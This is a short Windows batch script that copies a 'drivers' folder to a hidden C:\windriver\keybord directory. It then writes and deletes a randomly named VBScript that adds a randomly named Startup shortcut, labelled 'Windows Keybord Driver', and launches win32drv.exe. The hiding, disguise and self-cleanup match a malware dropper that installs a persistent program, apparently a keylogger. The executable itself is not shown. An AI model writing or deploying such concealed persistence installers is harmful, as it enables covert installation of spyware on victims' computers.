@echo off
cd /d %~dp0
robocopy drivers C:\windriver\keybord /E
attrib +s +h C:\windriver

set SCRIPT="%TEMP%\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs"

echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
echo sLinkFile = "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%RANDOM%.lnk" >> %SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
echo oLink.TargetPath = "C:\windriver\keybord\win32drv.exe" >> %SCRIPT%
echo oLink.WorkingDirectory = "C:\windriver\keybord" >> %SCRIPT%
echo oLink.Description = "Windows Keybord Driver" >> %SCRIPT%
echo oLink.Save >> %SCRIPT%

cscript /nologo %SCRIPT%
del %SCRIPT%

start C:\windriver\keybord\win32drv.exe